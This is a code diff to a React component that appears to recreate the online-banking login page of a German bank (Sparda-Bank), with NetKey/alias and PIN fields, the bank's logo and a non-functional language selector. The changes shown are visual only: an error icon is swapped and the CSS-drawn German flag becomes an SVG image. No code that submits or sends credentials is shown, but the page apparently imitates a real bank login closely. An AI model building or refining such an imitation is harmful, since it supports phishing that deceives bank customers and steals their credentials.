@@ -3,7 +3,8 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import { Eye, EyeOff, ArrowRight, ChevronDown, AlertCircle } from "lucide-react";
+import { Eye, EyeOff, ArrowRight, TriangleAlert } from "lucide-react";
+import germanyFlag from "@/assets/germany-flag.svg.asset.json";
 import logoAsset from "@/assets/sparda-logo.avif.asset.json";
 import teaserAsset from "@/assets/sparda-teaser.avif.asset.json";
 
@@ -118,7 +119,7 @@ const SpardaBankDe = () => {
                     </div>
                     {userError && (
                       <div style={{ color: ERR_COLOR, fontSize: 14, marginTop: 6, display: "flex", alignItems: "center", gap: 6 }}>
-                        <AlertCircle size={16} />
+                        <TriangleAlert size={16} />
                         <span>Sparda-NetKey oder Alias erforderlich</span>
                       </div>
                     )}
@@ -147,7 +148,7 @@ const SpardaBankDe = () => {
                     </div>
                     {pinError && (
                       <div style={{ color: ERR_COLOR, fontSize: 14, marginTop: 6, display: "flex", alignItems: "center", gap: 6 }}>
-                        <AlertCircle size={16} />
+                        <TriangleAlert size={16} />
                         <span>PIN erforderlich</span>
                       </div>
                     )}
@@ -250,13 +251,8 @@ const SpardaBankDe = () => {
               ))}
             </nav>
             <button className="flex items-center gap-2 text-sm" onClick={(e) => e.preventDefault()}>
-              <span style={{
-                display: "inline-block", width: 22, height: 22, borderRadius: "50%",
-                background: "linear-gradient(to bottom, #000 33%, #dd0000 33% 66%, #ffcc00 66%)",
-                border: "1px solid rgba(255,255,255,0.6)",
-              }} />
+              <img src={germanyFlag.url} alt="" width={22} height={22} />
               <span>Deutsch</span>
-              <ChevronDown size={16} />
             </button>
           </div>
         </footer>
